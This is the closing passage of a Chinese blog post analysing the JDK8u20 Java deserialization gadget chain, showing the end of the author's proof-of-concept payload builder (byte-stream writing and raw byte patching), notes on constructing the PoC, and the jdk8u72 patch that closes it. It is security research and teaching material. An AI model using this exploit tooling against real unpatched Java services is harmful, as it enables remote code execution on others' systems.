</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">baos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">treatObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">DataOutputStream</span> <span style="color:#e06c75">dos</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">throws</span> <span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Byte</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeByte</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Byte</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Short</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeShort</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Short</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Integer</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeInt</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Integer</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">Long</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeLong</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">Long</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeUTF</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span> <span style="color:#c678dd">else</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ByteArrayOutputStream</span> <span style="color:#e06c75">ba</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ByteArrayOutputStream</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">oos</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">ObjectOutputStream</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ba</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">oos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">obj</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">oos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">close</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">dos</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ba</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">toByteArray</span><span style="color:#56b6c2">(),</span> <span style="color:#d19a66">4</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ba</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">size</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">4</span><span style="color:#56b6c2">);</span> <span style="color:#7f848e">// 4 = skip the header
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#7f848e">//原生的replace()方法貌似没用, 只好重写了一个Replace()方法
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">public</span> <span style="color:#c678dd">static</span> <span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">T</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#61afef;font-weight:bold">Replace</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">bytes</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">T</span> <span style="color:#e06c75">target</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">T</span> <span style="color:#e06c75">replacement</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">targetB</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">replacementB</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">j</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">target</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">targetB</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">HexBin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">decode</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">target</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> <span style="color:#e06c75">targetB</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">target</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">replacement</span> <span style="color:#c678dd">instanceof</span> <span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">replacementB</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">HexBin</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">decode</span><span style="color:#56b6c2">((</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">replacement</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">else</span> <span style="color:#e06c75">replacementB</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[])</span> <span style="color:#e06c75">replacement</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[]</span> <span style="color:#e06c75">newbytes</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e5c07b">byte</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">replacementB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">targetB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">];</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">j</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">targetB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#e06c75">j</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">bytes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">j</span><span style="color:#56b6c2">++)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">targetB</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">bytes</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">j</span><span style="color:#56b6c2">])</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">else</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        if (j == bytes.length) throw new RuntimeException(&#34;Unable to match target!&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">j</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">bytes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">out</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">println</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Method-Replace: Unable to match target!&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arraycopy</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">,</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">newbytes</span><span style="color:#56b6c2">,</span><span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">j</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">targetB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arraycopy</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">replacementB</span><span style="color:#56b6c2">,</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">newbytes</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">j</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">targetB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">replacementB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">System</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">arraycopy</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">bytes</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">j</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">newbytes</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">j</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">targetB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">replacementB</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">,</span> <span style="color:#e06c75">bytes</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">j</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e06c75">newbytes</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p><strong>ps</strong>：在构造POC的过程中还碰到很多问题，比如实际字节流和预期字节流不符（点名<code>hashMap</code>，<code>_name</code>竟然引用了<code>templates</code>，最后只好手动修改字节流）、<code>JDK7u21</code>貌似跑不通<code>JDK8u20</code>链（可能是我的原因）等等</p>
<h3 id="构造poc的其他思路">构造POC的其他思路</h3>
<ol>
<li><a class="link" href="https://xz.aliyun.com/t/8277"  target="_blank" rel="noopener"
    >以一种更简单的方式构造JRE8u20 Gadget</a>——feihong师傅</li>
<li><a class="link" href="https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA"  target="_blank" rel="noopener"
    >JDK8u20反序列化漏洞新型PoC思路及具体实现 (qq.com)</a> ——沈沉舟师傅</li>
<li>&hellip;</li>
</ol>
<h3 id="高版本修复">高版本修复</h3>
<p>从<a class="link" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/8afb58c7312b"  target="_blank" rel="noopener"
    >jdk8u72-b12</a> 版本开始，<code>JDK</code>对<code>JDK8u20</code>链的<code>AnnotationInvocationHandler</code>进行了限制</p>
<p><code>jdk8u72-b12(2015-12-08)</code>修补方案</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>     <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">readObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectInputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>         <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">ClassNotFoundException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">-</span>        <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">defaultReadObject</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>        <span style="color:#e06c75">ObjectInputStream</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">GetField</span> <span style="color:#e06c75">fields</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">readFields</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>        <span style="color:#61afef">@SuppressWarnings</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;unchecked&#34;</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>        <span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">Annotation</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">t</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Class</span><span style="color:#56b6c2">&lt;?</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">Annotation</span><span style="color:#56b6c2">&gt;)</span><span style="color:#e06c75">fields</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;type&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>        <span style="color:#61afef">@SuppressWarnings</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;unchecked&#34;</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>        <span style="color:#e06c75">Map</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">streamVals</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Map</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">String</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;)</span><span style="color:#e06c75">fields</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">get</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;memberValues&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>         <span style="color:#7f848e">// Check to make sure that types have not evolved incompatibly
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span> 
</span></span><span style="display:flex;"><span>         <span style="color:#e06c75">AnnotationType</span> <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>         <span style="color:#c678dd">try</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">-</span>            <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">AnnotationType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">type</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">+</span>            <span style="color:#e06c75">annotationType</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">AnnotationType</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">t</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>         <span style="color:#56b6c2">}</span> <span style="color:#c678dd">catch</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">IllegalArgumentException</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>             <span style="color:#7f848e">// Class is no longer an annotation type; time to punch out
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>             <span style="color:#c678dd">throw</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">InvalidObjectException</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;Non-annotation type in annotation serial stream&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>         <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p><code>JDK8u72</code>不再调用<code>s.defaultReadObject()</code>，转而使用<code>s.readFields()</code></p>
<p>这样我们就获取不到完整的<code>AnnotationInvocationHandler</code>对象了</p>
<p><strong>ps</strong>：写这篇文章的时候忘了晚上有课，结果小组活动分和平时分都没了，痛！太痛了！┭┮﹏┭┮</p>
<h3 id="参考链接">参考链接</h3>
<p><a class="link" href="https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/POCloitGenerator.java"  target="_blank" rel="noopener"
    >JRE8u20_RCE_Gadget/POCloitGenerator.java at master · pwntester/JRE8u20_RCE_Gadget · GitHub</a></p>
<p><a class="link" href="https://tttang.com/archive/1357/#toc_0x00"  target="_blank" rel="noopener"
    >JDK8u20反序列化总结 - 跳跳糖 (tttang.com)</a></p>
<p><a class="link" href="https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA"  target="_blank" rel="noopener"
    >JDK8u20反序列化漏洞新型PoC思路及具体实现 (qq.com)</a></p>
<p><a class="link" href="https://www.freebuf.com/vuls/176672.html"  target="_blank" rel="noopener"
    >JRE8u20反序列化漏洞分析 - FreeBuf网络安全行业门户</a></p>
<p>本文原载于<a class="link" href="https://0zhanya.github.io/"  target="_blank" rel="noopener"
    >0ZHan&rsquo;s Blog</a>，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/java%E5%AE%89%E5%85%A8/">Java安全</a>
        
    </section>


    </footer>


    
</article>

    

    

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji"],"lang":"zh-CN","locale":{"admin":"站长","sofa":"还没有人评论哦！快来抢沙发吧~"},"placeholder":"欢迎留下宝贵的评论！","requiredMeta":["name","email","url"],"serverURL":"https://data-table-e038f1l82-0zhanya.vercel.app/"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2024 0ZHan&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
